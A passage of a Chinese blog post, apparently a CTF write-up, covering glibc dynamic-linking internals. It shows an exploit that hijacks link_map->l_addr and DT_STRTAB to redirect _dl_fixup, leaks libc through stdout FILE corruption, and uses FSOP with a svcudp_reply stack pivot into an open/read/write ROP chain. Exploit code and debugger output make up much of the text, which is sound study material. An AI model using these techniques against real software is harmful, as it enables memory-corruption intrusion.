<li>d_tag：标签所做的只是描述值，告诉加载器 <code>d_un</code> 数据的意义，常见的类型如下表：</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th><code>d_tag</code>类型</th>
<th><code>d_un</code>的定义</th>
</tr>
</thead>
<tbody>
<tr>
<td>DT_SYMTAB - 6</td>
<td>d_ptr 记录动态链接符号表(.dynsym)的地址偏移</td>
</tr>
<tr>
<td>DT_STRTAB - 5</td>
<td>d_ptr 记录动态链接字符串表(.dynstr)的地址偏移</td>
</tr>
<tr>
<td>DT_STRSZ - 10</td>
<td>d_val 记录动态链接字符串表(.dynstr)的大小</td>
</tr>
<tr>
<td>DT_HASH - 4</td>
<td>d_ptr 表示动态链接hash表(.hash)的地址</td>
</tr>
<tr>
<td>DT_SONAME - 14</td>
<td>本共享对象的SO-NAME</td>
</tr>
<tr>
<td>DT_RPATH - 15</td>
<td>动态链接共享对象的搜索路径</td>
</tr>
<tr>
<td>DT_INIT - 12</td>
<td>初始化代码地址</td>
</tr>
<tr>
<td>DT_FINIT - 13</td>
<td>结束代码地址</td>
</tr>
<tr>
<td>DT_NEED - 1</td>
<td>当前文件依赖的共享目标文件的文件名</td>
</tr>
<tr>
<td>DT_REL/DT_RELA - 17/7</td>
<td>动态链接重定位表地址</td>
</tr>
<tr>
<td>DT_RELAENT - 9</td>
<td>动态链接重定位表项的数目</td>
</tr>
</tbody>
</table>
</div>
<p>运行时，加载器将读取每个 Elf64_Dyn 条目，并在 ELF 的 <code>link_map</code> 中存储指向每个条目的指针（具体来说，指向每个 Elf64_Dyn 的指针将存储在 <code>link_map-&gt;l_info</code> 数组中，由标签索引）</p>
<ul>
<li>因此，加载器可以使用 <code>l-&gt;l_info[DT_XXX]</code> 访问对应的 Elf64_Dyn </li>
<li>例如：通过 <code>l-&gt;l_info[DT_STRTAB].d_un.d_ptr</code> 轻松读取 <code>DT_STRTAB</code> 的地址</li>
</ul>
<p>接下来就需要 [重定位表] 来索引目标的位置，每个条目都有一个 <code>r_offset</code> 属性，它指定符号的解析地址应该放在哪里：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword	r_addend;		<span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure>
<p>看了下面这张图就明白了：</p>
<p><img src="/2022/08/23/dl_runtime_resolve%20attack+svcudp_reply%E6%8E%A7%E5%88%B6%E6%A0%88/1661100223655-1661242874520.png" alt="1661100223655"> </p>
<ul>
<li>由于 <code>r_offset</code> 属性是一个偏移量而不是一个绝对指针，我们需要添加 <code>l-&gt;l_addr</code> 来获得解析地址，也就是如下代码的实现：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>当申请的堆块足够大时，可以申请到接近 libc 前面内存，有一次 WAA libc 的机会（只有1字节）</p>
<p>根据 <code>_dl_fixup_</code> 的寻址规则，我们在 <code>_dl_fixup_</code> 查找完函数地址回填到 GOT 表后，可以通过修改 <code>link_map-&gt;l_addr</code>，使回填的函数填到 <code>write@got</code> 某个偏移的地方（<code>bss-&gt;size</code>）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*RDI  <span class="number">0x7fcefdddf2e0</span> —▸ <span class="number">0x55a47f540000</span> ◂— <span class="number">0x10102464c457f</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fcefdddf2e0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi <span class="number">0x7fcefdddf2e0</span> —▸ <span class="number">0x55a47f540000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fcefdddf2e8</span> —▸ <span class="number">0x7fcefdddf888</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7fcefdddf2f0</span> —▸ <span class="number">0x55a47f543df8</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7fcefdddf2f8</span> —▸ <span class="number">0x7fcefdddf890</span> —▸ <span class="number">0x7ffdfdf5b000</span> ◂— jg     <span class="number">0x7ffdfdf5b047</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7fcefdddf300</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fcefdddf308</span> —▸ <span class="number">0x7fcefdddf2e0</span> —▸ <span class="number">0x55a47f540000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7fcefdddf310</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7fcefdddf318</span> —▸ <span class="number">0x7fcefdddf870</span> —▸ <span class="number">0x7fcefdddf888</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0x7fcefda86000</span> <span class="number">0x7fcefdddf2e0</span></span><br><span class="line"><span class="number">0x7fcefda86000</span>-&gt;<span class="number">0x7fcefdddf2e0</span> is <span class="number">0x3592e0</span> bytes (<span class="number">0x6b25c</span> words)</span><br></pre></td></tr></table></figure>
<p>示例代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">offset, <span class="built_in">bytes</span>, tag=<span class="literal">True</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">bytes</span>):</span><br><span class="line">        p.send(p64(offset + i))</span><br><span class="line">        p.send(p8(byte))</span><br><span class="line">        <span class="keyword">if</span> tag:</span><br><span class="line">            p.recvuntil(<span class="string">b&quot;Success!&quot;</span>)</span><br><span class="line"></span><br><span class="line">link_map_offset = <span class="number">0x3592e0</span> - <span class="number">0x10</span> <span class="comment"># 通过mmap申请的chunk与link_map之间的偏移</span></span><br><span class="line">p.send(p32(<span class="number">0xf0000</span>))</span><br><span class="line">size_addr = <span class="number">0x408c</span> <span class="comment"># 位于bss段的size</span></span><br><span class="line"></span><br><span class="line">write(link_map_offset, p8(size_addr-<span class="number">4</span> - elf.got[<span class="string">&quot;write&quot;</span>]))</span><br></pre></td></tr></table></figure>
<ul>
<li>执行覆盖的汇编代码：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*RAX  <span class="number">0x70</span> <span class="comment">/* 计算出来的,用于覆盖link_map-&gt;l_addr末尾的值 */</span></span><br><span class="line"> RDX  <span class="number">0x7f9e9d9ee2e0</span> —▸ <span class="number">0x556d291fe000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"></span><br><span class="line"> ► <span class="number">0x556d291ff4bb</span>    mov    byte ptr [rdx], al</span><br></pre></td></tr></table></figure>
<ul>
<li>修改前：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f9e9d695000</span>+<span class="number">0x3592e0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f9e9d9ee2e0</span> —▸ <span class="number">0x556d291fe000</span> ◂— <span class="number">0x10102464c457f</span> <span class="comment">/* link_map-&gt;l_addr */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f9e9d9ee2e8</span> —▸ <span class="number">0x7f9e9d9ee888</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7f9e9d9ee2f0</span> —▸ <span class="number">0x556d29201df8</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7f9e9d9ee2f8</span> —▸ <span class="number">0x7f9e9d9ee890</span> —▸ <span class="number">0x7ffec7501000</span> ◂— jg     <span class="number">0x7ffec7501047</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f9e9d9ee300</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f9e9d9ee308</span> —▸ <span class="number">0x7f9e9d9ee2e0</span> —▸ <span class="number">0x556d291fe000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7f9e9d9ee310</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f9e9d9ee318</span> —▸ <span class="number">0x7f9e9d9ee870</span> —▸ <span class="number">0x7f9e9d9ee888</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>修改后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f9e9d695000</span>+<span class="number">0x3592e0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdx <span class="number">0x7f9e9d9ee2e0</span> —▸ <span class="number">0x556d291fe070</span> ◂— <span class="number">0x8</span> <span class="comment">/* link_map-&gt;l_addr */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7f9e9d9ee2e8</span> —▸ <span class="number">0x7f9e9d9ee888</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7f9e9d9ee2f0</span> —▸ <span class="number">0x556d29201df8</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7f9e9d9ee2f8</span> —▸ <span class="number">0x7f9e9d9ee890</span> —▸ <span class="number">0x7ffec7501000</span> ◂— jg     <span class="number">0x7ffec7501047</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7f9e9d9ee300</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7f9e9d9ee308</span> —▸ <span class="number">0x7f9e9d9ee2e0</span> —▸ <span class="number">0x556d291fe070</span> ◂— <span class="number">0x8</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7f9e9d9ee310</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7f9e9d9ee318</span> —▸ <span class="number">0x7f9e9d9ee870</span> —▸ <span class="number">0x7f9e9d9ee888</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>通过 <code>l-&gt;l_addr + reloc-&gt;r_offset</code> 公式来计算 <code>write@got</code> </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Elf64_Rela &lt;<span class="number">4018</span>h, <span class="number">300000007</span>h, <span class="number">0</span>&gt;       ; R_X86_64_JUMP_SLOT write</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: hex(<span class="number">0x556d291fe070</span>+<span class="number">0x4018</span>)</span><br><span class="line">Out[<span class="number">1</span>]: <span class="string">&#x27;0x556d29202088&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>_dl_fixup_</code> 执行完毕以后，就会根据错误的 <code>link_map-&gt;l_addr</code> 来把错误的地址给改为 <code>write</code> 的真实地址</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x556d29202088</span></span><br><span class="line"><span class="number">0x556d29202088</span>:	<span class="number">0x000f000000000000</span>	<span class="number">0x6261747274736873</span></span><br><span class="line"><span class="number">0x556d29202098</span>:	<span class="number">0x707265746e692e00</span>	<span class="number">0x672e65746f6e2e00</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x556d29202088</span></span><br><span class="line"><span class="number">0x556d29202088</span>:	<span class="number">0x00007f9e9d89da20</span>	<span class="number">0x6261747274736873</span></span><br><span class="line"><span class="number">0x556d29202098</span>:	<span class="number">0x707265746e692e00</span>	<span class="number">0x672e65746f6e2e00</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x556d29202088</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x556d29202088</span> —▸ <span class="number">0x7f9e9d89da20</span> (write) ◂— endbr64 </span><br></pre></td></tr></table></figure>
<ul>
<li>我们可以发现 <code>bss-&gt;size</code> &lt; 0x10000，程序循环</li>
</ul>
<p>程序循环了，我们可以在 libc 中写入任意数据，不过我们想要泄露 libc_base 需要用到 <code>_dl_fixup_</code> 的机制：</p>
<ul>
<li>由于 write 的函数地址没有成功回填到 GOT 表，后面每次调用还会走 symbol 查找流程：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123; </span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]); <span class="comment">// DT_STRTAB id=5</span></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line"></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">  result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">  value = DL_FIXUP_MAKE_VALUE (result,sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>_dl_lookup_symbol_x</code> 函数的第一个参数就是待查找函数的函数名，而 <code>sym-&gt;st_name</code> 对于同一个函数而言是一个固定值（“write” = 34） </li>
<li>而 <code>strtab</code> 则是来源于于 libc 上的全局结构体 <code>link_map</code>，那么可以劫持 <code>link_map-&gt;l_info[DT_STRTAB]</code> ，使其指向可控内存段（比如说：<code>link_map-&gt;l_info[DT_DEBUG]</code>），达到任意函数调用</li>
</ul>
<p><code>DT_STRTAB</code> 在 elf 中，由于没有泄露任何地址，目前是通过偏移进行任意地址写，这里找到 <code>DT_DEBUG</code> 这个表是指向 libc 地址，可以通过改写最低位：</p>
<ul>
<li>把 <code>link_map-&gt;l_info[DT_STRTAB]</code> 低位覆盖为 <code>link_map-&gt;l_info[DT_DEBUG]</code> 这样程序就会误以为 <code>DT_DEBUG</code> 是 <code>DT_STRTAB</code>（这下放入 <code>_dl_lookup_symbol_x</code> 的第二个参数就会变成 <code>DT_DEBUG</code>）</li>
<li>于是我们提前在 <code>DT_DEBUG+34</code>（原来是 <code>DT_STRTAB+34</code>）的位置写上 <code>[function_name]</code>，就可以达到任意函数调用</li>
</ul>
<p>我们可以利用这个机制来 leak libc_base，示例代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stdout_ = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;_IO_2_1_stdout_ &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdout_))</span><br><span class="line">_IO_2_1_stdout_offset = _IO_2_1_stdout_+<span class="number">0xf4000</span>-<span class="number">0x10</span></span><br><span class="line">write(_IO_2_1_stdout_offset,p32(<span class="number">0xfbad1800</span>))</span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0x28</span>,<span class="string">b&#x27;\xff&#x27;</span>) </span><br><span class="line"></span><br><span class="line">r_debug_offset = <span class="number">0x359118</span>-<span class="number">0x10</span></span><br><span class="line">write(r_debug_offset+<span class="number">34</span>,<span class="string">b&quot;_IO_flush_all&quot;</span>) </span><br><span class="line"></span><br><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\xb8&#x27;</span>, <span class="literal">False</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x21ba70</span> </span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br></pre></td></tr></table></figure>
<ul>
<li>思路还是和上面的一样，只是执行的函数为 <code>_IO_flush_all</code></li>
<li>于是我们在 <code>_IO_2_1_stdout_</code> 中修改 FILE 结构体的条目，经过如下调用链后泄露 libc_base：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup -&gt; _dl_lookup_symbol_x -&gt; _IO_flush_all</span><br></pre></td></tr></table></figure>
<p>最后用同样的方法执行 FSOP，使用 <code>_IO_wdefault_xsgetn</code> 的调用链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all -&gt; _IO_flush_all_lockp -&gt; _IO_wdefault_xsgetn -&gt; _IO_switch_to_wget_mode</span><br></pre></td></tr></table></figure>
<p>示例代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\x78&#x27;</span>) <span class="comment"># fix</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># FSOP(_IO_flush_all_lockp --&gt; IO_jump_t.__overflow)</span></span><br><span class="line">heap_addr = libc.address - (<span class="number">0xf4000</span> - <span class="number">0x10</span>)</span><br><span class="line">success(<span class="string">&quot;heap_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite _IO_2_1_stdout_</span></span><br><span class="line">write(_IO_2_1_stdout_offset,p32(<span class="number">0x800</span>)) <span class="comment"># flags</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0xc0</span>,p8(<span class="number">0xff</span>)) <span class="comment"># _mode &gt; 1</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0x48</span>,p64(heap_addr)) <span class="comment"># _IO_save_base(rdi+0x48)</span></span><br><span class="line">_IO_wstrn_jumps = libc.address + <span class="number">0x215dc0</span> <span class="comment"># vtable(_IO_wstrn_jumps)</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0xd8</span>,p64(_IO_wstrn_jumps+<span class="number">0x28</span>)) <span class="comment"># _IO_wstrn_overflow-&gt;_IO_wdefault_xsgetn</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite _wide_data</span></span><br><span class="line"><span class="comment"># _IO_write_ptr</span></span><br><span class="line">_IO_wide_data_1_offset = <span class="number">0x30d9a0</span>-<span class="number">0x10</span></span><br><span class="line">write(_IO_wide_data_1_offset+<span class="number">0x20</span>,p8(<span class="number">0x1</span>))</span><br><span class="line">write(_IO_wide_data_1_offset+<span class="number">0xe0</span>,p64(heap_addr+<span class="number">0x110</span>-<span class="number">0x18</span>)) <span class="comment"># vtable(fake)</span></span><br><span class="line"></span><br><span class="line">rop = flat(</span><br><span class="line">    [<span class="string">b&#x27;./flag\x00\x00&#x27;</span>, pop_r12_r13_r14_ret],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, heap_addr - <span class="number">8</span>],</span><br><span class="line">    [leave_ret, pop_rdx_r12_ret],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>,<span class="number">0xdeadbeef</span>],</span><br><span class="line">    [pop_rdi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rsi_ret, <span class="number">0</span>],</span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, pop_rax_ret],</span><br><span class="line">    [<span class="number">2</span>, syscall_ret], <span class="comment"># open(&#x27;/flag&#x27;,0,0)</span></span><br><span class="line">    [pop_rdi_ret, <span class="number">3</span>],</span><br><span class="line">    [pop_rsi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0x40</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, read_addr], <span class="comment"># read(3,&amp;buf,0x40)</span></span><br><span class="line">    [pop_rdi_ret, <span class="number">1</span>],</span><br><span class="line">    [pop_rsi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0x40</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, write_addr], <span class="comment"># write(1,&amp;buf,0x40)</span></span><br><span class="line">    svcudp_reply26</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">write(<span class="number">0</span>,rop)</span><br><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\xb8&#x27;</span>, <span class="literal">False</span>) <span class="comment"># trigger _IO_flush_all</span></span><br></pre></td></tr></table></figure>
<ul>
<li>先还原 <code>DT_STRTAB</code></li>
<li>修改 <code>_IO_2_1_stdout_ FILE</code> 结构体，利用 vtable 偏移的思想实现 vtable 任意函数调用（<code>_IO_flush_all_lockp</code> 原本会调用 <code>_IO_wstrn_overflow</code> ，修改 vtable 偏移后变为调用 <code>_IO_wdefault_xsgetn</code>）</li>
<li>然后在 <code>_IO_wide_data_1</code> 中伪造数据：<ul>
<li><code>_IO_wide_data_1+0x20</code> -&gt; [RDX]</li>
<li><code>_IO_wide_data_1+0xe0</code> -&gt; [RAX]</li>
</ul>
</li>
<li>我们可以控制 [RAX]，并且在 [RAX+0x18] 中提前写入 ROP 的地址</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> RAX  <span class="number">0x7f8099bc0108</span> ◂— <span class="number">0x40</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"> RDI  <span class="number">0x7f8099ece780</span> (_IO_2_1_stdout_) ◂— <span class="number">0x800</span></span><br><span class="line"> RDX  <span class="number">0x1</span></span><br><span class="line">*RIP  <span class="number">0x7f8099d37d55</span> (_IO_switch_to_wget_mode+<span class="number">37</span>) ◂— call   qword ptr [rax + <span class="number">0x18</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f8099bc0108</span>+<span class="number">0x18</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f8099bc0120</span> —▸ <span class="number">0x7f8099e1e1fa</span> (svcudp_reply+<span class="number">26</span>) ◂— mov    rbp, qword ptr [rdi + <span class="number">0x48</span>] <span class="comment">/* ROP */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>gadget svcudp_reply 可以控制会 [RBP] 为 [RDI+0x48]（我们提前在 <code>_IO_2_1_stdout_+0x48</code> 中伪造好 ROP_addr），同时会 call [RAX+0x28]，在这里放入 <code>leave ret</code> 就利用控制栈了</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 